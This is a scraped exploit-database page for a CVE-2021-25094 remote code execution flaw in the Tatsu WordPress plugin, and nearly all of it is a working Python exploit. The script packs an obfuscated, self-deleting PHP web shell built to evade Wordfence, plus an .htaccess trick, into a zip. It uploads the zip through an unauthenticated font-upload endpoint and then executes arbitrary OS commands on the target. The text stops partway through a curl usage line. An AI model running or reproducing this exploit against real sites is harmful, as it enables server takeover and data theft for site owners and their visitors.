---
title: Tatsu 3.3.11 Unauthenticated RCE
url: https://cxsecurity.com/issue/WLB-2025040027
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-23
fetch_date: 2025-10-06T22:02:48.050268
---

# Tatsu 3.3.11 Unauthenticated RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tatsu 3.3.11 Unauthenticated RCE** **2025.04.22**  Credit:  **[Milad Karimi](https://cxsecurity.com/author/Milad%2BKarimi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2021-25094](https://cxsecurity.com/cveshow/CVE-2021-25094/ "Click to see CVE-2021-25094")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "CWE-434")** | |

# Exploit Title:Tatsu 3.3.11 - Unauthenticated RCE
# Date: 2025-04-16
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# MiRROR-H: https://mirror-h.org/search/hacker/49626/
# Product: Tatsu wordpress plugin <= 3.3.11
# CVE: CVE-2021-25094
# URL: https://tatsubuilder.com/
import sys
import requests
import argparse
import urllib3
import threading
import time
import base64
import queue
import io
import os
import zipfile
import string
import random
from datetime import datetime
urllib3.disable\_warnings()
class HTTPCaller():
def \_\_init\_\_(self, url, headers, proxies, cmd):
self.url = url
self.headers = headers
self.proxies = proxies
self.cmd = cmd
self.encodedCmd = base64.b64encode(cmd.encode("utf8"))
self.zipname = None
self.shellFilename = None
if self.url[-1] == '/':
self.url = self.url[:-1]
if proxies:
self.proxies = {"http" : proxies, "https" : proxies}
else:
self.proxies = {}
def generateZip(self, compressionLevel, technique, customShell, keep):
buffer = io.BytesIO()
with zipfile.ZipFile(buffer, "w", zipfile.ZIP\_DEFLATED, False,
compressionLevel) as zipFile:
if technique == "custom" and customShell and os.path.isfile(customShell):
with open(customShell) as f:
shell = f.readlines()
shell = "\n".join(shell)
self.shellFilename = os.path.basename(customShell)
if self.shellFilename[0] != ".":
self.shellFilename = "." + self.shellFilename
zipFile.writestr(self.shellFilename, shell)
elif technique == "php":
# a lazy obfuscated shell, basic bypass Wordfence
# i would change base64 encoding for something better
shell = "<?php "
shell += "$f = \"lmeyst\";"
shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
shell += "@$words = array(base64\_decode($\_POST['text']));"
shell += "$j=\"array\".\"\_\".\"filter\";"
shell += "@$filtered\_words = $j($words, $a);"
if not keep:
shell += "@unlink(\_\_FILE\_\_);"
self.shellFilename = "." +
(''.join(random.choice(string.ascii\_lowercase) for i in range(5))) + ".php"
zipFile.writestr(self.shellFilename, shell)
elif technique.startswith("htaccess"):
# requires AllowOverride All in the apache config file
shell = "AddType application/x-httpd-php .png\n"
zipFile.writestr(".htaccess", shell)
shell = "<?php "
shell += "$f = \"lmeyst\";"
shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
shell += "@$words = array(base64\_decode($\_POST['text']));"
shell += "$j=\"array\".\"\_\".\"filter\";"
shell += "@$filtered\_words = $j($words, $a);"
if not keep:
shell += "@unlink('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"
shell += "@unlink(\_\_FILE\_\_);"
self.shellFilename = "." +
(''.join(random.choice(string.ascii\_lowercase) for i in range(5))) + ".png"
zipFile.writestr(self.shellFilename, shell)
else:
print("Error: unknow shell technique %s" % technique)
sys.exit(1)
self.zipname = ''.join(random.choice(string.ascii\_lowercase) for i in
range(3))
self.zipFile = buffer
def getShellUrl(self):
return "%s/wp-content/uploads/typehub/custom/%s/%s" % (self.url,
self.zipname, self.shellFilename)
def executeCmd(self):
return requests.post(url = self.getShellUrl(), data = {"text":
self.encodedCmd}, headers = self.headers, proxies = self.proxies,
verify=False)
def upload(self):
url = "%s/wp-admin/admin-ajax.php" % self.url
files = {"file": ("%s.zip" % self.zipname, self.zipFile.getvalue())}
return requests.post(url = url, data = {"action": "add\_custom\_font"},
files = files, headers = self.headers, proxies = self.proxies, verify=False)
def main():
description = "|=== Tatsudo: pre-auth RCE exploit for Tatsu wordpress
plugin <= 3.3.8\n"
description += "|=== CVE-2021-25094 / Vincent MICHEL (@darkpills)"
print(description)
print("")
parser = argparse.ArgumentParser()
parser.add\_argument("url", help="Wordpress vulnerable URL (example:
https://mywordpress.com/)")
parser.add\_argument("cmd", help="OS command to execute")
parser.add\_argument('--technique', help="Shell technique: php | htaccess |
custom", default="php")
parser.add\_argument('--customShell', help="Provide a custom PHP shell file
that will take a base64 cmd as $\_POST['text'] input")
parser.add\_argument('--keep', help="Do not auto-destruct the uploaded PHP
shell", default=False, type=bool)
parser.add\_argument('--proxy', help="Specify and use an HTTP proxy
(example: http://localhost:8080)")
parser.add\_argument('--compressionLevel', help="Compression level of the
zip file (0 to 9, default 9)", default=9, type=int)
args = parser.parse\_args()
# Use web browser-like header
headers = {
"X-Requested-With": "XMLHttpRequest",
"Origin": args.url,
"Referer": args.url,
"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/90.0.4430.212 Safari/537.36",
"Accept": "\*/\*",
"Accept-Language": "en-US,en;q=0.9"
}
caller = HTTPCaller(args.url, headers, args.proxy, args.cmd)
print("[+] Generating a zip with shell technique '%s'" % args.technique)
caller.generateZip(args.compressionLevel, args.technique,
args.customShell, args.keep)
print("[+] Uploading zip archive to
%s/wp-admin/admin-ajax.php?action=add\_custom\_font" % (args.url))
r = caller.upload()
if (r.status\_code != 200 or not r.text.startswith('{"status":"success"')):
print("[!] Got an unexpected HTTP response: %d with content:\n%s" %
(r.status\_code, r.text))
print("[!] Exploit failed!")
sys.exit(1)
print("[+] Upload OK")
print("[+] Trigger shell at %s" % caller.getShellUrl())
r = caller.executeCmd()
if (r.status\_code != 200):
print("[!] Got an unexpected HTTP response: %d with content:\n%s" %
(r.status\_code, r.text))
print("[!] Exploit failed!")
sys.exit(1)
print("[+] Exploit success!")
print(r.text)
if args.keep:
print("[+] Call it with:")
print('curl -X POST -d"text=$(echo "{0}" | base64 -w0)"
{1}'.format(...